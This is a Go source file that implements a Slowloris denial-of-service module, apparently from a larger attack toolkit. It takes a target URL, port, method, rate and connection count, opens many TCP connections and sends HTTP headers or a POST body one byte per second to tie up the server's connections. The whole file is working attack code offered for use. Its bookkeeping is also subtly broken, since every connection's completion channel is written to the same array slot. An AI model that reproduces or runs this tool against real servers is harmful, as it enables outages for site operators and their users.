package module

import (
	"os"
	"log"
	"strings"
	"time"
	_"syscall"
	"math/rand"
	"net"
	"net/url"
	"strconv"

	_"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

type SlowlorisOpt struct {
	BaseOption
	UrlFunc func(string) `short:"u" long:"url" description:"target url" value-name:"url" default:""`
	url *url.URL
	PortFunc func(string) `short:"p" long:"port" description:"target port" value-name:"port" default:"80"`
	port uint16
	MethodFunc func(string) `short:"X" long:"request" description:"specifies a custom request method to use when communicating with the HTTP server" value-name:"<method>" default:"GET"`
	method string
	CountFunc func(int) `short:"c" long:"count" description:"maximum connections to establish" value-name:"count" default:"0"`
	RateFunc func(string) `short:"r" long:"rate" description:"establish connections as a specific rate, such as 2/s, 100/min, the default is \"1/s\" " value-name:"<speed>" default:"1/s"`
	TimeoutFunc func(string) `short:"t" long:"timeout" description:"keep http connection until timeout expires" value-name:"<seconds>" default:"0"`
	timeout uint
}

func (s SlowlorisOpt) IsBroadcast() bool {
	return false
}

func slowlorisEntry(stopChan chan int, remainFlags []string) {
	var opts SlowlorisOpt

	opts.UrlFunc = func(rawurl string) {
		if strings.Count(rawurl, "://") == 0 {
			rawurl = "http://" + rawurl
		}
		if rawurl[:7] != "http://" {
			log.Fatal("unsupported scheme")
		}
		u, err := url.Parse(rawurl)
		if err != nil {
			log.Fatal("url parse error: ", err)
		}
		opts.url = u
	}
	opts.PortFunc = func(portStr string) {
		if len(portStr) > 0 {
			opts.port = parsePortOrDie(portStr)
		}
	}
	opts.MethodFunc = func(method string) {
		opts.method = method
	}
	opts.TimeoutFunc = func(timeout string) {
		i, err := strconv.Atoi(timeout)
		if err != nil {
			log.Fatal("parse timeout error: ", err)
		}
		opts.timeout = uint(i)
	}

	opts.RateFunc = func(rate string) {
		commonRateFunc(&opts, rate)
	}
	opts.CountFunc = func(count int) {
		commonCountFunc(&opts, count)
	}

	//fmt.Println(remainFlags)
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		log.Fatal(err)
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return
		}
	}
	if opts.timeout == 0 {
		opts.timeout = 0xffffffff
	}

	slowlorisStart(stopChan, &opts)
}

func slowlorisStart(stopChan chan int, opts *SlowlorisOpt) {
	second := time.Tick(time.Second)
	var curCount uint = 0

	var throttle <-chan time.Time
	if opts.Rate() != time.Duration(0) {
		throttle = time.Tick(opts.Rate())
	}
	count := opts.Count()
	fin := make([]chan int, count)

	for {
		if curCount >= count {
			break
		}
		select {
			case <-second:
				log.Printf("%d http connect established\n", curCount)
			case <-stopChan:
				return
			default:
				break
		}
		if throttle != nil {
			<-throttle
		}
		fin[count - 1] = make(chan int)
		go httpConnect(opts, fin[count - 1])
		curCount++
	}

	for i, _ := range fin {
		<-fin[i]
	}
}

func slowWrite(timeout chan int, conn *net.TCPConn, data string) bool {
	throttle := time.Tick(time.Second)
	dataByte := []byte(data)
	for _, c := range dataByte {
		<-throttle
		conn.Write([]byte{c})
		select {
			case <-timeout:
				return true
			default:
		}
	}
	return false
}

func httpConnect(opts *SlowlorisOpt, fin chan int) {
	timeout := make(chan int)
	go func() {
		time.Sleep(time.Second * time.Duration(opts.timeout))
		timeout <- 1
	}()

	host := opts.url.Host
	if strings.Count(host, ":") == 0 {
		host += ":" + strconv.Itoa(int(opts.port))
	}
	raddr, err := net.ResolveTCPAddr("tcp", host)
	if err != nil {
		log.Fatal("http host parse error: ", err)
	}
	log.Println("raddr = ", raddr)
	conn, err := net.DialTCP("tcp", nil, raddr)
	if err != nil {
		log.Fatal("DiaTCP error: ", err)
	}
	err = conn.SetKeepAlive(true)
	if err != nil {
		log.Fatal("tcp set keep alive failed: ", err)
	}
	err = conn.SetNoDelay(true)
	if err != nil {
		log.Fatal("tcp conn set no delay: ", err)
	}
	conn.Write([]byte(opts.method + " " + opts.url.Path + " HTTP/1.1\r\n"))
	conn.Write([]byte("Host: " + opts.url.Host + "\r\n"))
	conn.Write([]byte("Connection: keep-alive\r\n"))
	if opts.method == "POST" {
		conn.Write([]byte("User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"))
		conn.Write([]byte("Accept-Encoding: gzip, deflate, sdch\r\n"))
		conn.Write([]byte("Accept-Language: zh-CN,zh;q=0.8\r\n"))
		conn.Write([]byte("Content-Type: application/x-www-form-urlencoded\r\n"))
		content := make([]byte, 1000, 1000)
		for i, _ := range content {
			content[i] = byte(rand.Intn(26) + 97)
		}
		conn.Write([]byte("Content-Length: " + strconv.Itoa(len(content)) + "\r\n\r\n"))
		for {
			if slowWrite(timeout, conn, string(content)) {
				fin <- 1
				break
			}
		}
	} else {
		for {
			if (slowWrite(timeout, conn, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n") ||
					slowWrite(timeout, conn, "Accept-Encoding: gzip, deflate, sdch\r\n") ||
					slowWrite(timeout, conn, "Accept-Language: zh-CN,zh;q=0.8\r\n")) {
				fin <- 1
				break
			}
		}
	}
}
